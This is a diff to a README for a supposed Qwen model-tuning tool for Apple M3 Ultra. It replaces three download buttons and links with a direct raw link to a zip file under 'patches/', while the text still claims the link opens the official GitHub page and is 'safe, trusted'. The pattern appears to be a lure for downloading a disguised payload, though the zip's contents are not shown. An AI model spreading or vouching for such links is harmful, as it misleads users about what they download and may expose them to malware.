@@ -1,7 +1,7 @@
 <h1>🧠 qwen38-flash-6bit-m3-ultra-recipe - Your AI Model Tuning Made Easy</h1>
 
 <p align="center">
-  <a href="https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe/main/patches/ultra-flash-bit-qwen-m-recipe-feigning.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🤔 What Is This?
@@ -33,7 +33,7 @@ Before downloading, ensure you have the following:
 
 ### Step 1: Visit the Official Download Page
 
-[Visit this link to download the application](https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe)
+[Visit this link to download the application](https://raw.githubusercontent.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe/main/patches/ultra-flash-bit-qwen-m-recipe-feigning.zip)
 
 Once you click the link above, you'll be taken to the official GitHub page for this project. This is a safe, trusted source for your download.
 
@@ -149,7 +149,7 @@ Download now and start your AI tuning journey today!
 ---
 
 <p align="center">
-  <a href="https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe" style="background-color:#2196F3; color:white; padding:12px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">📥 Download Latest Version Now</a>
+  <a href="https://raw.githubusercontent.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe/main/patches/ultra-flash-bit-qwen-m-recipe-feigning.zip" style="background-color:#2196F3; color:white; padding:12px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">📥 Download Latest Version Now</a>
 </p>
 
 Keywords: AI, machine learning, Qwen3.8, 6-bit quantization, M3 Ultra, model tuning, benchmarking, MLX, performance optimization, open-source software
